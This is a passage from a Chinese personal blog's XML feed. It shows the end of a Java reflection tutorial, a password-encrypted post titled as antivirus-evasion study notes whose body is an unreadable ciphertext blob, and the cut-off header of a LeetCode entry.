String.class)</code>。</p><p>获取类的所有构造方法：<code>clazz.getDeclaredConstructors</code>来获取一个<code>Constructor</code>数组。</p><p>当我们没有访问构造方法权限时我们应该调用<code>constructor.setAccessible(true)</code>修改访问权限就可以成功的创建出类实例了。</p><p>获取到构造器之后，可以使用<code>constructor.newInstance()</code>来创建类实例。</p><h3 id="反射调用类的方法"><a href="#反射调用类的方法" class="headerlink" title="反射调用类的方法"></a>反射调用类的方法</h3><p><code>Class</code>对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。</p><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] methods = clazz.getDeclaredMethods()<br></code></pre></td></tr></table></figure><p><strong>获取当前类指定的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>, 参数类型如String.class，多个参数用<span class="hljs-string">","</span>号隔开);<br></code></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到<code>当前类和父类</code>的所有有权限的方法(如：<code>public</code>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)。</p><p><strong>反射调用方法</strong></p><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><p><strong>调用类方法代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="hljs-string">","</span>隔开);<br></code></pre></td></tr></table></figure><p><code>method.invoke</code>的第一个参数必须是类实例对象，<strong>如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在java中调用静态方法是不需要有类实例的</strong>，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</p><p><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，<strong>如果有参数那么就必须严格的依次传入对应的参数类型</strong>。</p><h3 id="反射调用成员变量"><a href="#反射调用成员变量" class="headerlink" title="反射调用成员变量"></a>反射调用成员变量</h3><p>这个其实在Java安全领域没有太大的作用，姑且列在这里，毕竟开发才是大头。</p><p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p><p><strong>获取当前类的所有成员变量：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> clazz.getDeclaredFields();<br></code></pre></td></tr></table></figure><p><strong>获取当前类指定的成员变量：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span>  <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">"变量名"</span>);<br></code></pre></td></tr></table></figure><p><code>getField</code>和<code>getDeclaredField</code>的区别同<code>getMethod</code>和<code>getDeclaredMethod</code>。</p><p><strong>获取成员变量值：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(类实例对象);<br></code></pre></td></tr></table></figure><p><strong>修改成员变量值：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure><p>同理，当我们没有修改的成员变量权限时可以使用: <code>field.setAccessible(true)</code>的方式修改为访问成员变量访问权限。</p><p>如果我们需要修改被<code>final</code>关键字修饰的成员变量，那么我们需要先修改方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> field.getClass().getDeclaredField(<span class="hljs-string">"modifiers"</span>); <br><span class="hljs-comment">// 设置modifiers修改权限</span><br>modifiers.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span><br>modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);<br><span class="hljs-comment">// 修改成员变量值</span><br>field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀学习记录</title>
    <link href="/2024/06/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/06/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="65ac4630fb6837ff87e684cb9300934c913e4fbf242c91797ff370df4ae70586">80f7af2430a3dce6996ee26d1569b238162cc0d7b02137d8db319d02716fd0b96be3b741deae6419c18f062da5ae4e515c76c2b48d81b03637c910bb7ab2bdf0f0c4ad57ad5c02177d710752f6633266f3409b780a2f78d79551de20257f9554d494958ccfe87de21972a8f630f0623f5d747b0ab10da93cc35dcbf162e4f0e2a20cc830c0e82b2e211909f0ea8db2933ae8ea76ef461c80e43d4f7834fdb0661e6132305729c9fadefa4da472051f052e09cfe1efe0b180e16073ca885df960310871172437038a42ac71008c9525e0005fe3da9904d169d87512042032096f730351dcaf6099a37691a650fb58872a43a5754f7488990a031b1e5f98da95d5ba2911007202dfccb5c10d2b9b876060f761c1480164da789cc4a001ef6ddb1903c25a722ff26d1f1a159d33d66b2af52f957c50c1768c7f629b854b377432a8211496c294b596732b55d73ff1627b2a8592f777084cca83bce245b0cf2eb6d14116f578ebd9706756facfd5474fa82916648f2b5b110c35f9a9897b57bdd0e628c5fb7f96344a4c39cc1f12e4bb54538b87d2db8c8f8a83a29ea9134b2df478be95f2a330b90bef9fddcec7dfbc5bb560d8bc95ce606da553ce1a116d25779c7fc8a67d6ba30bf142dcb6148f52bbf7f6fc741076f5f435ca39370aa72e3b0fe827c79583d16507795c4d4263a4a0fe768893acc8a5725666830c30faf30c45766a16928d4a37a894328ff0311767492f18755f7364d8b0d77a818af96044b47fb6bbdeff16d8a12eeab129889fd949779028506332d032e1d7f9d4c58129fe8bf032e4477d6246a6ba4c54ed208b8221dc248f0285c550cb645cb283f1ecf49a38ee55585b9e23c39a5797033f275b2e17ba8bcb4a8bd0b37a5c24c57c3058376d0c589eeda92052eb9abd45923186ec1d794df8500ff09a2e3174bde39819c7fabdc12bb60a8d895a3983ab7d7254963ae04034f3d290df5fcb3f11c7daaa1cb451c43a7a74c2722d2f670402791e9f220b3d1a562371e628fdd96a1abe14935428856561f3f40be5da5c360c6ae115174d67d626cfc6cec8837a65ad4cb24448220ddcf50fe61c96254d65d4e91777840138afc329ddeaa479d0555dea1c5bd5d825b34365bfd83c3bc009c44f68f63ab759ebb48e4a7657f72c5ad360c29bdf94096a40ac3e89215b34263786f78d6ce95a97b24fec39ff85a827f5850b1e9a95d746487bf58b59c9631366d89c32953f0bf03700e6e42f89004e26870b214846dfcd2c84c51019de9d5b69871656c857bda486fa2ce837c17508208a3257b0725fc374fd6f3c1292548107a96e3fb00bff089b20a739bfb4707c0c245d86d7e0e53c85172f33d596db177e7feaab3d076a928a7b6b04468d6580b683640491a53f806f982ebbb3e4f69dc3c52195498f1317db33cf52c026d137495f89e4030d62b291dc4f1a80b49dc80bf611de0f01f42164ef62f1c8d167726edd69b465342006dc117fb6cfe19402be53fce4716be0a94d244854c617180c8a3e7e5bd1e89cb53427f32d4b7dcfacb48a3e4d49eebbdf770fb0f9d523eb6eb64dc67b65c6125882bc443e2a59081f28eb8b0f2ecc003149ba447e4e534e92e696014787ff77d338ab13bc81e2d39f22b35a7acf9ae763fb858ff4b3c7553e5523abd01b7921d477ea41b3823fcb552072b762b65bb737b7e5379f6ad79dd568e351fe688419ba5e773586174928a4499435086e4f521b5524c4421e609651c4930d90ef60ea1731e022d2b9943a7c668153fefbf5f2771db2370e16b586c288144d7c871139587bc0af35b4e325e15dec6623c683803dff5008f1fd800ecd94c472ba08de4eec805a0f6e42c40c0188f4bbcb845dc14fdbf201b926152f7856728ea43ebda4c2c3e7197ab13f1e79596aa69d25b0b7b71e5f4a365133e895a32dce8d8f27d516ea06ffd2655c2c610a488efae29c88457ce641377bd9f624ce8967d82e77cd839740d6adabc734edb58dc5e58d9e6a3afe7ca15309d06328b6427b70f97a2ce5778cde8dc0599b5e254ca758d62ca2053faa6dae459d088392000751c0d42c2be3b4c5e3436f453a7a0108e0d416209761c3541703918a7c04c429d1bbadbb7d2536d80f566a063e0e2de7a164411a90ebd495cfd78fcf9622ff2522dce03707b6c335f59240acf79c7a6d80a7f1f834d0bd81174e55627f81361246aeff3a1ce7803744e5f4ea9265bec2f1a766bf6bad743230d6ba1c561da250129c3e9306691bf3d0c379da1daa35f28c7d451e55781c58a7e515a0c468d6361aee289676b2a73d1f0c5bad0337100767430e88ec826300d2e3160280857e0a592a0d52972c4ac6077be509302cb717fc55af417c5fdcb380cf1d096ef99b0f80b678967191f8dbe8c01826e57652816a8fe8ef3bdc1ab7761b756415cd75cc8872ac92496a34edc7110eb056083fd09413fc5e92eb180b63915e601a99199fd0e294e27573747cca234c51a5b6d6243995106124f4d8521a43b686aaf1ac4685787fa365797db561b7760a51eb049e06c3c7d96cb383ac12df5e802c1fbc8dc52f64e402eee89caebc92e55bb4810cef86afc2d59bbd2f3facce442637762fba3551423b4a95615724149ce53a609644ecc845c55e1ef64c79c90e5f683837aa31932480daada1d76cfbce4fcf276e491c474e14130e5eb68c6cc010b5dc080491708f441f871efa3a64ac7622215d4db9247457e2f70afa9232abce5a126057938747eec9e6806fd216294092ccf8f22e95e7c0a8e81538381de7399489bc19fc387fc7f522b589c73034f7a2031656349317879ed02bc34351efe2643693a9e8a5fa199485bc6dd26d53340c8169c4eade0401d78503897bea826cb576b5efda1a14c4e9b290ad82542440b940b3c7269d2766257d65c3e5e6c803c5e91369e16326d0f564f8675ee7c66ba1cf760b7cd640df1508e5638e65e7087c8de69223bafb5d3c1d597ebbd0e6be23572edb1bfcabbb763b5e8f2d54d74cdcfc74674c20ecf58974b33a2089aaeda70244a97cec15783b0d1d8d209836490a96b43b4b66658256ca215fea831c29eaf51e5349c59f7880f69ab60d4526dae036467e3994e8044ab470d2c0dafd0133ef887f7561872c252ad182fe65b673c253f834b061368c692b8c05bde6c0e47340b02c98a658d4c3e84adc86ab6cbd4504186d7325002bd4fa085fc23e575c40f2dbe369eb14e83b68a9b17cffc3bbdff1a8ecdb9df82f9cfbeb8b037442b10be1c63ac2c818790f1300a6a06697a9945c7dcc00193a029987be958587de23a72cf6995769c366eae376e10077c0da8a944b54907bb9328a406a10bceb8a1ffa0ef5e52fab48051690d9b13f98b87df42f92114469d5ce7dfc179da9af009d027bc306f202557276c0ae5603ed71d8dcf4fd1d1dfe89360b5a55fb4b1f9747e79307ffd2e37a6bdbdc25830c01334b0ec3e23bcd722747108d050ed99b4f76f601fe12a600693066cd213926e9c6e1cea78ec6b5ce269d02f3eaed3d176dca13506e7a2ebece9b1ed8baf71258fe32571ef53bb58366928a682c3d127f12e4c61316a6f78ba76f92796f9950e973a359bf1689498615269834aa60b2d34e7ede49466e432cadccf180addcd9712467e982dd7a083261b9b6880a648a13d7b5af1416ba2bb92d8cee9319522d45e1bfc064a32fc649e22de4bf0be73b5f5272d1c49701e02537e7d7f9b0b5b2a61fe07db3f62ce67b508a7d44f63d3493ed453bf873fc4454903d33f32eb2bf9bc8deff426c96cc1fe876c01856fa28a84a5e92d4dab6dd53d84a1cc62e768c43d527a2e39642dbb9aa833361e0509bf65f59286088f4651e835da3e7c2c63a906300b1eb90a44ba21b5db9e11aa51639ab1915d6a12abe3ae2a2c35f3fe644d943e995617d2b8248313183c430f1399c793d05f44e9b4005812818601a0110ed54b9e1dc45e647c8df1fc2f85a8dc1dde5f0648b74cbd47d7a2e10ab72c4fcaa2b31e9619ca923784d51bcef0d9d94e84914cb2766ac892092fe7fb60712a60124814f1f2c9f16b958120172cf2b00668a3630224c783d8ccfd9a4060cfa1f089d35db04f9fb6e98116cdbd1ad310f9b117a7a15fbd7547fd0416ee7cf2623306240ed2f0c26049ce3d9cfc25cc7440c5309ebe0bda720a8f46ce19be3e73d3b01d9e812537e15c98745b4c71c8d2f7b34d9e951a79b71f2d6f1ee650a3fc247526c0ad9363f3e7886bcbf7c30852d8a4591b7f1107c56d668bd8a0c6b35f6891b8ebf82ba8d744ae0a6e40ce21491f61f222c61b3b8fdf7de16257829d4e3c7ae1bd64bd35bd80097bc30171ebf3fb3e617b9fb7111229f9906bfe46d8bd6da519fbb097091cbd3216f25d9bccaf04cb466b77442e122c2481f780c94d348ef69470fad3d197e84317e010de3c64c6e757d8a1b3b9e9bedacb2d3732ff564fdf2c1d68490a929b7c192e4d5791c831e0f513098161b41c6f7b8f9829e78df17a9ce462371b2e54a7c4dc992b3446ce3d6388658de04d1558c2cb80ef498f64d5c6ae85aba9895141b62af2391efc7224c9d792ba016f997449d7ba4fdb66aff0e599e800c684747bd94538344024631897a06e0b749732a46af80488f30287bc4885bc71dd235f46519f6afa4ba6aaee745eff3bca427ced5908c9f4c55818dce88d153937f60fa29033a4cf96d0c585371dad868a601e6c0232e1340dcadacb6af3c358041feab26edcc86100fc18151c55c59aabe2b3b571d35076e0ca2b3af13d8abf9f84fa84ff5d45bf3bee74b541444dfc79d80472aee39d1802b3773b42cff7877d20668b5697613c6176f382b6be8e1eaf81f347f75575bb4bb7377af480846aff6dc9d5e9835767a9a5fc7eb62fbc186aa2b7010f70029dfd59adcadc814f2693876a6d09604a29422214e98161aad064f7c5dda7e00ed77b7d9f9880ab3bb9fc9a1ad16d7238753f1d3d68a6f382753d5d0a33ded7dd0cf31ad4c44a073efe6616a01e1214325c3bb556f53a56078276b442f60114cc9878e8ee51b446928e2d48f83dec54ad55668103206636d3fc953cf4fd3dd94aae74f11f9e889235aa110523609bc60079e79cfb4458b2cf51cc11db347c403b10863b0725f13d8dbfa1408fa91cfba1e5cc07e0bfa4b9fe4bd77080e73ea920fde51b140139c0334cfadde29ea7d55d9ddf35d8624977056364cf54010ee7e9e5d8c061cc0f2734d38b9c59485b709aeff8d07b416729a8b0d7eec70a547d53e29480215b5e79215293ce3afa5c0169c7a83f749ae6ab5721afbdcd2701c1b479749936a4ccf73a0a13b316b9377f72089cd7445e46ed8df479380c632eef6962374ea762918f2669ee6f144fa462d1dafe12071ed0f9e5cd6f4264983df4410a8c0cb1e96e68f07e2bb415f6b14b0bb4704c878dedd78b5555d8d8d39000eb4971f8c0e108929512ec2e9de101e6c4525ef25a9804bd3a05efdfdf9ce5b1943e5d9981db425ffb4e7476eac13d39dff740f43161f3bb7f81a04142a28676d9795109ede45b4f2b4ec488b722255bf98364ba71d1ac7610d01cdcae39881a22483f966296d8eb13c9929d5dde8f7d82ac8ad2980d2db6b2d11e4b1cd3359ab957a50423a46077a6f106507936acb484f84c70130d7970733974f6eb0a89700f01dd4abcf541b648bdebb2e9ad77d90bccd3101d6bded59cfba0c48aebf9873a478f9a92231b58e23e319c1785c2aae9e8e85aa1500777065f0839faeabbde12f491a921f8feb54196678a1ea4f88e4d092d72a4e013deadf0d6de9a461d555d9d4a42afa9a8243baa040f4548e97709e5c93d8818cb3f3198f03586dab6c7cec248a7c908d38e5fd6b35e66dca9b90b0b975c5c8a46ed0121a00588f82f3308e7cf018199547e0b973d636d2975ee067f12eb7a7b208832a45b80986bf5cf683bf228686a974bd2d8cf6011548d46195ef79e8385abfde8bae04d51ff0c8ef710cea31c870018050b9ad1501232a2daf42c1aeecaaa2c012c1e1543e162ab198b86859b7baf0f50fdf7839fa9ed418f5a14ad35abf98cd053e65b54f4ad0ededddf33f6d64eaa7d4d866de45a8212034d448cd723be42fbe0351152b28d10907445f9423884d23c50a281cfd66aaab0cc70d1fe3215df674ebb59bb553b9812c14936f2882c9c617d6653680fe0335301f5296bfc9db9cc9c2b9fb44bbe1dcc515e68dc5299751fa2c795f339a4b7cea82ce8f0a21588a7f6689ef25ff3ebb9d2ee145bd5e38545cf2f542bd0c93f032e69580468a28c9f602fb41c123c28f5cf5ca1f5b154c76eb1d7a9ebfd6210cb1a0f3c8754842ce5cc71e7533068f7c97313df21e779f9a4389c3d3033580f20a9152332c91b66255ef99152f5e6a371b8f135c70d86f8e3ba919ae3d21150639072c9dd214502196fdf68e1dfd06c28a178123502a98ccb5ffbdec8990445430affd2a3c48102e15eb897ebbce8d62ba1c731131fa301395f6d7dfb16b48dfa779d08f302e68e07231d64c60bf8db243ace907a49a9ba7ad7708fc66b05b3c0d4f191b1d89e4d11042342abcab48fd42be60093f6bb3dba554fbfcc1f7189093fa73b065f141a7978158c5f9be9c91b72c466b879982c5418bd4c20b786978122411449ac76d685158f33dcbbbf2c5f0f15af1c96185db6659e6b98ce5c4e6f2b4504c2d5c91c4d5725fb43de8ac72d821ad421bf3e876e92a7ace3c07e360f7ea8c7d37561fcdefd63652249fe0c2a5b3821e237f4a9eae9e7a0ecc3249e4e7c0f2956d0394b789f6995194c386018fb1535a3bb48ce964134fffba2826eb72ee9e44dc337d33eb77dcb9ee17329cfc6183596d613aa70aa8c382754b71251795277c8ab7755b89c8142dca9f02d395212c4eb0508a0cac48219b51844cda5f20fe907c662433258131f9f7e72b2e981e8c6379c6638cea0ba9ec9f84fbcfb23fcc37d7619b4b4a72b87f0eb3d1039a85895e79503b1773c5a6b080adf173cfd3310228c63f08160f470e577dd849cf1a7b76b9f48b082d603bb6be7100d661a8195a088c45c92666418f7e92653fe4a10475524aeda675674bf651e0bf17a84c400b4a0a5e3e2b03aa44d0b9e41b805599cdd4f501483f7f7b07964d2613b4197a0caa781095003a910efe3128ce94c90f612d279ddbe3c91a3068658ea7806ecd331fdf43961c75806882d59044deda15b1e9242c4d931c36db9887b3c64db26fe0782bb0107c842afcf939102696bbbe107c6cd12e1a39855bdc46585e7d812e83b7144c53487aef2164ce8d3f6690484790b5c169bf844dacc63f9ec704f6981639dd24b33db7bcf9c3042aca42e9e602abd16e7a8684b8805f746f5e6ffc6b352a39ebe47b3e296b161f4172df20f94b7af7b6438c125a4d6238550a041c632e0ab550d273b852c2b65ae1c375a244f46dfa20bcc0bb72d08ef70839f215d753df14afc924c2f912e0ee91bc607bed04c9ebe477563f41f50fe148d32d6878adfe050b643b32a7106bd5886ac183c74ba7ccfe1ee939d2d5df15f864bbfc842d580ec86e8300f34af32d99d67492bef990a91ba52d48fe2df284cfa601add69fb0cbb94109228ef476f26179f15b0ae03dd1c30eb48e72a1718d5485afd4bf232644d0ae7c7701219d3dfac9b08b9190c3f622cdc4b152db2f343d4220a659f91e850aa18d3720f30d294573294992269f35341a5106eb0e2b6d9a59bf6d5dc5556c2a0e12c6570f8f9de261152096b63b0b7f4d67adecd0e39df2f492d4e54190068e95ad38652c0f5c8648157879926b42e12bb9f6e106d8d93853a76d47ec7ee0b75b5332ef93242198f2257e9a71efcb42e07f663f8264aadae02234b7e93dc685d89efc4923d8977709d2f71b095b0403624dfe3f279c38f5440fe8fa49cb764083f439d3e93e1d752d2381013382091325a1a697000e4f19e8d3f3e720a1fee5012fdd7d16aadd0772ac40ade269ab9336a746662b987341efee08e07a9cf3a89e2f5a5fcadfff67a9e7ba0876544031bf801f374b385b554e0d211cdb77e24bcdfc85b4fe561a25e8be2eb6cda3ee7b4442f7751e0583f09fdc88067346bb15aec2ffbc1a24002bfd2cc69060ba5983b21ddbbc1924b80829e3663eb9d31fa41ee58d75a741697327d3d6240180985774eaa017d911cc8785e1cb7b9c4665a4fab5329cbe12ae81abf54b6d382c15459c3320f981e436d9ac88fb9a2fc12f7e16c975f50b59022cc6c6c3e18bedc1c4705e08d1a44b39c34c908ca780dfdbdca77641ddfe8541ab5e8be186eae6210676eadc89af63009ce157a46121b8f7606ad3f1338a8eb1e8dd249dd656c543c09759ad5b94aaaf4a5ecc4cff140079c0cd621265e80704bd44e2f371c1eebf9f279cc1937e365e722707e37a88bf3883616ec9b0e34e2660083094ab9799d683df5bf10f37f2ad3b530ed5e5727284523070d90cd2c58492ffe42fde3c82e275ba436d94a9a1c9bb239474a7fb361aed42f020b07eb638a19b14f759883363da58fb4ce1412cabe34a375bbd7af5834ecf162ad20e27029377961dad51c098da8770cfa425c48ebf4a99c953d266449144b7f12decf6835befae8cfce71a915874493d730ef69ec6234af9c1564a3be1244916e1f237713419b807ab64fe3c9869cc665f4eda5863ff6aaf1c56fa3ff98bf7e38778a7886ce244d8068f4d3f663df4ca2b31fce142e85c28d8eb8ef392c78efbd21a2c522ab4256bfa3b76b7462b21dba97dcd7c6c45275d5527ffc3a0629a22689e5aacc5fa3b2d6f0dfd40ec320821ed9dca67f198a64edeb9c50c610e90e2aeee8abdb8a113d6041541364f16b11a99100be1a4928b5674b57a7a1884220a0da763c2640cb4698a011f1c8309d47faac08bc9772de250a1424327f7d7262495ccd7dd83738ed3c4a4780bdb796ac8f16ee2767436f90d56c961173b9a08a23ea3853da50612c1e913d11afde9919dca148c815157bc3ecd027241c8796b2d5331375e09848ea137c686cc0784883ed4b27efd1ca121616e955a133b7f8c243ddd740d3071d24ab3910c7856b92a88cb780aff1bab0e0c3163639859f903bc939042f9102a1cb0785b57820e62df764ef81c6d4a799cf7694bdce84e562ea0c679217eca2919a4b52ab2c94059cbf879020e1fee65f7043df4c6006c41d2671815a49491eb0866cda95599ff6defca5bf5a6cdba49f6b117617ee6faa47356b5e6c1fa498b760e39e8650908e0ac5ffc0e84f4370c7c9fbe385cbde4bf0c41381c5f74afd105734145b375d43128cb0e6448db25a1fec18c2df1336183d3f3217b2b086cfbc9c120bb37e47b1f0a73a1090c9d2357bf6348e437273b995bb6d79aa4d1615c25967fcdd64ddcdf2def0f644cf645e2f83fe73a3d7cddac369e139c8d9551ac07aed6ff7c76a49832a64cb190cec2346bd11e56b698efbf03289ddfc4db5f51a7737bd29d0144b3994e8be14cff6f54898db58624edccdae4d76303d86f89f697d02d3247882d6406e60c0e23443d200b6d5cf05ecac5c3f01a2e2ad7abe994cbbcb937bf59260584462586f2f07d00a2874d022e111a47d3be7ed69f9a8d97fa491f0b0189f808adec98eb9b8178d23cee88b1372102a2049ec3a3e847812c085c0204a42662d4cac0684432624ad2992b127fea2aeca761a4e3e9d3b7f6a2967d2e5b094556f10345354bcb855bf57dd7ac3694eeac1adb3ed421f13d511d55bd1a3248972590638ac3c9455184ca7cb8f436e2994cd5f0331c9bc05f13acaaa8e602919944baac6870099c6cbfdcdf55bb41c7cac6fa5a298c157fc378a1cd787a817c956ba9051fadc0bf67892e267da6dafc522d6c17f0519a3b37cf60cb927a3e1ce6c8fd6cf1e2f63ee38295c7c210cb182228f9568c1ca2f959dcabfdbf1784185baf14d2882fa6110eb7b7aec8fe9f5cc5f0f6451d2bf47c94077d69e4bad2767d2392e4bc509b1f4911d45d541df4d9c747d1dc4a67781007e6b3a41e8569777354eda17baa94a40e88a2486a0fd66e5c460b86fe09b58d6ef05853d6a03c2e8d0c911b28ddd55520db692fe98a2b4961f75ce989a2eafd5433551236583eb4b54c450b229e2b6688afb3be2776841a09350a47e02fc86271466384f95f4157276050e642cfbbb8d093464d6e25695f2038f740917474cccc9815c2886b31d3011621b4b98c2aed3546f386b841e54e2408c5baa360f8a924999ecc817f550f9185f6a9291a484fe10149b7b9d9e7919174a746b4b122b60b11350cc400e99ea582fb9e89fbc58388ba0bb8edb16cbdfb32ef6ef9f74f7f6965410ec1e387e3043b1b500c09eb77978dcc88f7034a935c3fc4e244e6f36134da94f83d7d62e365ec780160162702b2e96d99b2b5697e357b3c8d6fa7ba34a98d02474568193e9055f16a98f323e5eb0ebd4e8794ca16c0758f17c41c82addb5b6ca780f412301c8332547295b58c4dd954f40ee20659a0dc63a2f6b3baeeec6b587e44150aa0ff4871812b4428560d0cfc96a86d1f2b61a3953f66650a45ffef5abec2ef0a3004969792262daf555c7a6016f43ff85a0172007bec8509844e6721c7e794f23ce77f18223381227d538f53fbe3cf3c95332457f62572979f86bfe116fa699df16c2b1e55c6f2dc9984daa3577a8f7132fc8ec7b234547fb35f27a68cb46f36545685f68e5977b5d45022fd583588a5be85e02ab0823f5a338c3848a299c3c6774b68254ccc8775e570d687b0ae6372d59efd8c557efae0ea8abb76d99ed6e65d9903158750f865c6dad998c374e079e7d167c75d3ff9a3b4c76718521445140ef07fe950a5158518adae27a1a7083d64267196f7f0ffb053dff58ac4f2407268989d997df51065cd3df68d4a323b4a22499ab06633479577039ddc0fd24eae5f60da787c4b56c7f40ab80d197801254ab4ecd8941e41234f6dd253587dc38793726fd3efec73c74db4beba28139da4334a70167a534177e3b5427e3b42314a7c84dcd2da10873fe77cedd54fb455cbbe1b97fb5e3685dabdf56055b4f76dd374cae9adf3edf0c267deef3f7c0faeca093e5971633636a17f1f5f4c0a6bde7901c79a242c68e424adcb915b5d05751a24746fe5f2ddf9028bbe04cb13cbfe3cae16c47bfdd15e50b93c82901de7b8b41d14539e15c06fcddcb9f4c9ba28f31b208c61cdcd8368f425d40226f664e1ed4403b6b14fe4283dfacdabd1f8b2de140b3681d5fc43ceaf30caadfc98490484c87a0f3728202b417ad5d4f01ed0aede755013da98f3cb041399407bf69717675eace8b738806c59b558fe50b1cec8a81d8b38caa5f005ede77a837c8a5dcc27e92c1c25191b4f403fde5e5728cdc463fca86c6eb0a2b3021e0ffbb48422b57acdfcbe6e807d793bb80a8f8d42bac2132fc513cab90655dad5ca16879c35bf21723f5f3f62bf4bc1b24f1bf4987c76c3852557327f79457ab2ae9b002ffb13df69ae8461c22a2e7ced9da1063873e40dbe8f020869db2d955e55570f25057a1e1c28a2daccdaef605c6dc95c7b283f63b6d64f232f85ad447af60ffff5a04c423f2b7450e834c5732b4bad15fba769d42d462fc0d31c54c0a796989e6588981769d3a6a004bd39ecf9cae073f42f8ef2b996bb2e48e6770977789dafc376c6248280cf207e73d1ec47d666670aa54ffedf9398879c98097889ed97fc42ceea7a3d98c186298835015775bcf61ee002efa3841c7251292ddd8f8b1048fe6d1c4d8d2d04a7c48e1f2169017157e73c27e4f32425709feeffa5bca980804dc53c0d9b12ad689d2c57752006c652ea4d76c5184f8f4670683285ba83eb9efdc106b6d608d68fd171c15d92e95001fed38e1ddb486544ca854cad70a1e93877c76d6465709e83213276ae077243855a13f8d8ff428c2cc66935a4e7be05fb0e2570f9ba4e0d1d400054b4b7f57b658b4223f19af52e622a02099c9a0e2dafd398fb53ad15c63439ec89cdb57166db9294abe2976509420bc74673eac25314347494d41302a5a4fa0f00cd8dc673959d3fffc5eb7361b2ed7feae9a02300584e763ad75e77ac0a9766100330dbcaf6c1de8fa747f3c3bd2bf9b73f582d7a46cdb27637a75123235a438b9083479bc07501152045556874617e66806c2fa927db842ebe245e9034e207a5a5428906fb9ebf0bad808048892ab15ecd1046b0e0b466baed8aaa0c92e85e35e88a6792fedd6010aef9994a94f1ca</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>红蓝对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode236复习二叉树的祖先节点</title>
    <link href="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/</url>
    
